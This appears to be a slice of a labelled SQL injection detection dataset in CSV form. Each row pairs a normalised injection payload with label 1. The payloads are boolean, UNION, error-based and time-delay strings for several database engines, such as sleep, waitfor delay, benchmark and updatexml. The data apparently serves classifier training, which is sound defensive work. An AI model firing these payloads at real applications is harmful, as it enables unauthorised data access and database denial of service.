row_index,payload_norm,label,sqli_type_hint
2490,"-8043%"" ) ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ( ""%"" = """,1,
2491,-6122' ) ) ) or 9243 = 6161--,1,
2492,"-9725 ) where 9068 = 9068 or elt ( 4723 = 1426,1426 ) --",1,
2493,"1%"" ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
2494,"1 ) as cejp where 4736 = 4736 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
2495,1'+ ( select 'mxlb' where 4900 = 4900,1,
2496,"1 ) ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( 1729 = 1729",1,
2497,"1%"" ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1,
2498,"1"" where 2452 = 2452",1,
2499,"select sleep ( 5 ) and ( ""innk"" = ""innk",1,
2500,"1' or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and 'nhmz' like 'nhmz",1,
2501,-4248 where 3288 = 3288 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,1,
2502,"-7601"" ) ) ) union all select 1293,1293,1293,1293,1293,1293,1293,1293--",1,
2503,"1' ) ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( 'dsok' = 'dsok",1,
2504,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) ||'",1,
2505,1'+ ( select 'ymgm' where 8204 = 8204 and sleep ( 5 ) #,1,
2506,"-4838' ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,
2507,"1'+ ( select llcl where 8188 = 8188 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
2508,1' ) ) ) and sleep ( 5 ) #,1,
2509,"1%"" ) ) waitfor delay '0:0:5' and ( ( ""%"" = """,1,
2510,"1 ) ) as uizx where 2512 = 2512 and make_set ( 1402 = 2908,2908 ) --",1,
2511,"-9353"" where 4607 = 4607 union all select 4607,4607,4607,4607,4607,4607#",1,
2512,"1' in boolean mode ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) #",1,
2513,"1 ) ) as amyr where 7875 = 7875 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,
2514,"1%' ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( '%' = '",1,
2515,"-4236 ) union all select 5260,5260,5260,5260,5260,5260,5260,5260,5260#",1,
2516,"1 ) ) ) union all select null,null,null,null,null,null,null#",1,
2517,"1"" or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ""ncym"" like ""ncym",1,
2518,-7175' or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and 'upzo' = 'upzo,1,
2519,-6423' ) or 6872 = 6872,1,
